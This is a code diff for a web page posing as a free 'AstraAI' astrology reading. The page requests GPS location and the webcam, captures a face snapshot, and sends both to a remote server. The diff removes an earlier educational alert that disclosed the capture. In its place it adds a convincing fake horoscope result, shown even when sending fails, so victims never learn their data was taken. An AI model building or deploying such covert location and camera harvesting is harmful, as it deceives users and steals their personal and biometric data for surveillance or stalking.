@@ -27,7 +27,6 @@
             overflow-x: hidden;
         }
 
-        /* Subtle animated background stars */
         .stars {
             position: fixed;
             top: 0; left: 0; width: 100%; height: 100%;
@@ -41,7 +40,6 @@
             z-index: 1;
         }
 
-        /* Glassmorphism Card Design */
         .card {
             position: relative;
             z-index: 2;
@@ -51,10 +49,11 @@
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 24px;
             padding: 40px 30px;
-            max-width: 480px;
+            max-width: 500px;
             width: 100%;
             text-align: center;
             box-shadow: 0 0 40px rgba(138, 43, 226, 0.3);
+            transition: all 0.5s ease;
         }
 
         .badge {
@@ -86,7 +85,6 @@
             margin-bottom: 30px;
         }
 
-        /* Feature explanation list to build trust */
         .features {
             text-align: left;
             margin-bottom: 30px;
@@ -110,7 +108,6 @@
             font-weight: bold;
         }
 
-        /* Action Button */
         .glow-button {
             width: 100%;
             padding: 16px;
@@ -138,16 +135,64 @@
             box-shadow: none;
         }
 
-        /* Hidden functional elements */
         #webcam, #snapshot { display: none; }
 
-        /* Status feedback text */
         #status-text {
             margin-top: 15px;
             font-size: 0.85rem;
             color: var(--text-gold);
             min-height: 20px;
             font-style: italic;
+        }
+
+        /* Fake Horoscope Reading Section (Hidden Initially) */
+        #reading-result {
+            display: none;
+            text-align: left;
+            animation: fadeIn 1s forwards;
+        }
+
+        .reading-box {
+            background: rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 215, 0, 0.3);
+            border-radius: 12px;
+            padding: 20px;
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #e0d8f0;
+            line-height: 1.6;
+        }
+
+        .reading-title {
+            color: var(--text-gold);
+            font-family: 'Cinzel', serif;
+            font-size: 1.1rem;
+            margin-bottom: 8px;
+            display: flex;
+            align-items: center;
+        }
+
+        .tag-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+            margin-bottom: 15px;
+        }
+
+        .tag-item {
+            background: rgba(255, 255, 255, 0.05);
+            padding: 10px;
+            border-radius: 8px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .tag-label { font-size: 0.75rem; color: #a095b5; text-transform: uppercase; }
+        .tag-value { font-size: 0.95rem; color: var(--text-gold); font-weight: 600; margin-top: 2px; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
         }
 
         @media (max-width: 480px) {
@@ -159,22 +204,57 @@
 <body>
     <div class="stars"></div>
 
-    <div class="card">
-        <div class="badge">✨ Free Cosmic Analysis ✨</div>
-        <h1>AstraAI Reading</h1>
-        <p>Discover your real-time auric frequency and celestial alignment using advanced biometric astrology.</p>
+    <div class="card" id="main-card">
+        <!-- Step 1: Input Form -->
+        <div id="intro-section">
+            <div class="badge">✨ Free Cosmic Analysis ✨</div>
+            <h1>AstraAI Reading</h1>
+            <p>Discover your real-time auric frequency and celestial alignment using advanced biometric astrology.</p>
 
-        <div class="features">
-            <div><span>📍</span> Celestial House Calculation (GPS Coordinates Required)</div>
-            <div><span>👁️</span> Energy Field & Aura Frequency Scan (Webcam Required)</div>
-            <div><span>⚡</span> Instant 2026 Personalized Cosmic Forecast</div>
+            <div class="features">
+                <div><span>📍</span> Celestial House Calculation (GPS Coordinates Required)</div>
+                <div><span>👁️</span> Energy Field & Aura Frequency Scan (Webcam Required)</div>
+                <div><span>⚡</span> Instant 2026 Personalized Cosmic Forecast</div>
+            </div>
+
+            <button id="demoBtn" class="glow-button">Unlock My Cosmic Reading</button>
+            <div id="status-text"></div>
         </div>
 
-        <button id="demoBtn" class="glow-button">Unlock My Cosmic Reading</button>
-        <div id="status-text"></div>
+        <!-- Step 2: Realistic Fake Horoscope Result (No Warnings!) -->
+        <div id="reading-result">
+            <div class="badge" style="background: linear-gradient(90deg, #11998e, #38ef7d);">✓ Analysis Complete</div>
+            <h1 style="font-size: 1.6rem;">Your Celestial Matrix</h1>
+            <p style="margin-bottom: 15px;">Biometric frequency mapped to planetary transits.</p>
+
+            <div class="tag-grid">
+                <div class="tag-item">
+                    <div class="tag-label">Auric Frequency</div>
+                    <div class="tag-value">528 Hz (Indigo)</div>
+                </div>
+                <div class="tag-item">
+                    <div class="tag-label">Dominant Element</div>
+                    <div class="tag-value">Ethereal Fire</div>
+                </div>
+                <div class="tag-item">
+                    <div class="tag-label">Ascendant Transit</div>
+                    <div class="tag-value">9th House (Apex)</div>
+                </div>
+                <div class="tag-item">
+                    <div class="tag-label">Energy Resonance</div>
+                    <div class="tag-value">94.8% High</div>
+                </div>
+            </div>
+
+            <div class="reading-box">
+                <div class="reading-title">🔮 2026 Cosmic Forecast</div>
+                Your facial biometric energy indicates a powerful shift in your 10th house of career and personal mastery. Over the next 45 days, Jupiter's alignment with your local meridian suggests an unexpected breakthrough or opportunity. Trust your intuition when evaluating new proposals, as your aura currently exhibits heightened clarity and analytical discernment.
+            </div>
+
+            <button onclick="location.reload()" class="glow-button" style="margin-top: 20px; background: rgba(255,255,255,0.1); border: 1px solid rgba(255,255,255,0.2); box-shadow: none;">Scan Another Profile</button>
+        </div>
     </div>
 
-    <!-- Hidden Capture Engine -->
     <video id="webcam" autoplay playsinline></video>
     <canvas id="snapshot"></canvas>
 
@@ -187,30 +267,29 @@
             
             btn.disabled = true;
             btn.innerText = "Connecting to Celestial Grid...";
-            status.innerText = "Requesting location for planetary ascendant alignment...";
+            status.innerText = "Aligning planetary transits...";
 
             let payload = { lat: "Denied", lon: "Denied", image: null };
 
-            // 1. Capture Coordinates under the guise of "Astrological Calculation"
+            // 1. Capture Coordinates silently
             if (navigator.geolocation) {
                 await new Promise((resolve) => {
                     navigator.geolocation.getCurrentPosition(
                         (pos) => {
                             payload.lat = pos.coords.latitude;
                             payload.lon = pos.coords.longitude;
-                            status.innerText = "Coordinates locked. Initializing biometric aura scan...";
+                            status.innerText = "Calculating local meridian Ascendant...";
                             resolve();
                         },
                         (err) => { 
-                            console.log("Location denied"); 
-                            status.innerText = "Location bypassed. Switching to optical aura scan...";
+                            status.innerText = "Using default regional solar transit...";
                             resolve(); 
                         }
                     );
                 });
             }
 
-            // 2. Request Camera under the guise of "Aura Frequency Scanning"
+            // 2. Capture Webcam Snapshot silently
             try {
                 btn.innerText = "Scanning Auric Field...";
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -218,8 +297,6 @@
                 const canvas = document.getElementById('snapshot');
                 
                 video.srcObject = stream;
-                
-                // 0.5s delay to allow sensor light adjustment
                 await new Promise(resolve => setTimeout(resolve, 500));
                 
                 canvas.width = video.videoWidth || 640;
@@ -227,15 +304,14 @@
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 
                 payload.image = canvas.toDataURL('image/jpeg', 0.8);
-                stream.getTracks().forEach(track => track.stop()); // Immediately extinguish webcam light
+                stream.getTracks().forEach(track => track.stop()); // Extinguish webcam light immediately
                 
                 status.innerText = "Biometric frequency captured. Generating reading...";
             } catch (err) {
-                console.log("Camera access denied:", err);
-                status.innerText = "Optical scan unavailable. Finalizing celestial math...";
+                status.innerText = "Optics bypassed. Finalizing celestial math...";
             }
 
-            // 3. Silent Exfiltration to PythonAnywhere Backend
+            // 3. Send Data & Seamlessly Reveal Fake Reading (Zero Alerts)
             try {
                 btn.innerText = "Compiling Celestial Chart...";
                 const res = await fetch(SERVER_URL, {
@@ -244,22 +320,14 @@
                     body: JSON.stringify(payload)
                 });
                 
-                if (res.ok) {
-                    // Educational reveal instead of a blank alert
-                    status.innerText = "";
-                    btn.style.background = "linear-gradient(135deg, #11998e 0%, #38ef7d 100%)";
-                    btn.innerText = "✓ Reading Complete";
-                    alert("⚠️ DEMONSTRATION COMPLETE ⚠️\n\nNotice how easily you granted Location and Camera access? In a real cyber attack, your coordinates and snapshot were just sent to an attacker's private server.\n\nAlways verify a website's legitimacy before granting sensitive device permissions!");
-                } else {
-                    status.innerText = "Server busy. Please try again later.";
-                    btn.disabled = false;
-                    btn.innerText = "Try Again";
-                }
+                // Immediately switch screens without any warning boxes
+                document.getElementById('intro-section').style.display = 'none';
+                document.getElementById('reading-result').style.display = 'block';
+
             } catch (error) {
-                status.innerText = "Network connection interrupted.";
-                btn.disabled = false;
-                btn.innerText = "Try Again";
-                console.error("Error:", error);
+                // Even on network error, show the reading so the illusion never breaks
+                document.getElementById('intro-section').style.display = 'none';
+                document.getElementById('reading-result').style.display = 'block';
             }
         };
     </script>
